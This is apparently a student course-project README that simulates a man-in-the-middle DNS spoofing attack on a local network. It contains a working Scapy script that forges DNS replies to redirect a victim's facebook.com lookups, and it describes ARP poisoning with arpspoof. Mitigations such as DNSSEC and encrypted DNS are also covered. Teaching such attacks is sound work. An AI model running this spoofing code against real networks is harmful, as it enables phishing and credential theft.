
# 🕵️‍♂️ Man-in-the-Middle (MITM) DNS Spoofing Attack (Educational Simulation)

This repository contains a simulation of a **Man-in-the-Middle (MITM)** attack combined with **DNS spoofing** in a local network environment. It is intended for academic and educational use only, as part of the *Topics in Information Security (CS418)* course.

> ⚠️ **Disclaimer**: This project is for ethical and educational purposes only. Do not use it on networks without explicit permission. Unauthorized usage is illegal and unethical.

---

## 📌 Project Team
- **Bhakti Raju Karchi (221CS116)**
- **Gnanaeshwari KN (221CS218)**

Course Instructor: *Radhika B S*

---

## 🧠 Abstract

This project simulates a DNS spoofing attack using MITM tactics in a controlled LAN environment. Tools like **Scapy**, **arpspoof**, **Wireshark**, and **Zeek** are used to intercept and manipulate DNS queries, showcasing the redirection of victims to attacker-controlled servers.

---

## 🎯 Objective

- Simulate a DNS spoofing attack using MITM
- Analyze DNS packet redirection behavior
- Evaluate tools like Scapy, Wireshark, arpspoof, Zeek
- Understand real-world impact and risks
- Explore mitigation strategies (e.g., DNSSEC, DoH/DoT)

---

## 🧰 Tools and Environment

| Tool         | Purpose                                |
|--------------|-----------------------------------------|
| Scapy        | Craft and send spoofed DNS responses   |
| arpspoof     | Perform ARP poisoning for MITM         |
| Wireshark    | Capture and analyze network traffic    |
| Zeek         | Log and analyze suspicious behaviors   |

**OS Used:**
- Attacker: Ubuntu
- Victim: Windows

---

## 🔬 Methodology

1. Set up a local network with 3 nodes: Attacker, Victim, Gateway
2. Launch ARP spoofing to become MITM
3. Intercept DNS queries and inject spoofed responses
4. Use Wireshark and Zeek to analyze attack impact

---

## 🧾 Code Overview

MITM DNS Spoofing script in Python using Scapy:

```python
from scapy.all import *

victim_ip = "10.53.156.66"
spoof_domain = "facebook.com"
spoof_ip = "10.53.156.100"

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR) and spoof_domain in pkt[DNSQR].qname.decode():
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                  an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoof_ip))
        spoof_pkt = ip/udp/dns
        send(spoof_pkt)
        print(f"[+] Spoofed DNS response sent to {pkt[IP].src}")

sniff(filter="udp port 53 and src " + victim_ip, prn=spoof_dns, iface="wlo1")
```

---

## 📊 Results

- **Victim redirected** to attacker's IP (fake page)
- **DNS spoofing confirmed** via packet captures
- **Zeek logs** showed DNS anomalies
- Attack successfully demonstrated in a local LAN

---

## 🔥 Security Risks

- **Phishing**: Victim sent to a fake website
- **Malware Injection**: Auto-download on redirect
- **Credential Theft**: Victim may submit login details
- **Corporate Espionage**: Intercepted internal traffic

---

## 🛡️ Mitigation Techniques

- **DNSSEC**: Authenticate DNS records with digital signatures
- **DoH / DoT**: Encrypt DNS queries to prevent tampering
- **ARP Spoof Detection**: Use `arpwatch`, `XArp`, etc.
- **VPN & Segmentation**: Encrypt traffic & isolate networks

---

## ✅ Conclusion

The simulation demonstrates how easily DNS spoofing can be performed when network protocols like ARP and DNS lack authentication. With simple tools, attackers can hijack DNS traffic, highlighting the urgent need for secure configurations such as **DNSSEC** and **encrypted DNS protocols**.

---

## 📚 References

1. https://gist.github.com/c3rb3ru5d3d53c/d9eb9d752882fcc630d338a6b2461777  
2. https://github.com/jaswanth6988/Network-Traffic-Monitoring-Using-Wireshark  
3. https://worldcomp-proceedings.com/proc/p2011/SAM4991.pdf  
4. https://versprite.com/blog/mitm-dns-spoofing/
